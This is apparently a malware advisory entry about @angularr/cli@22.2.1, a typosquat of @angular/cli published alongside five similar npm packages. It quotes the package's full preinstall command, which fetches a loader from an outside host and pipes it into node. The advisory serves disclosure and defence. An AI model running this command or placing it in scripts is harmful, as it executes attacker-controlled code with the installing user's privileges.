details: @angularr/cli@22.2.1 impersonates @angular/cli (it copies the code and metadata of @angular/cli, including the `ng` binary) and adds a preinstall script that runs on npm install and pipes a remotely hosted loader into node: `curl -L https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=node.js | node`. This runs attacker-controlled JavaScript with the installing user's privileges. The npm account angularr published @angularr/cli and 5 similar packages on 2026-10-03 between 06:33 and 07:23 UTC, all with the same preinstall script.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code

files.note: preinstall script pipes the web.archive.org copy of gitflic.ru hellscripter/install-scripts node.js into node (@angularr/cli@22.2.1).
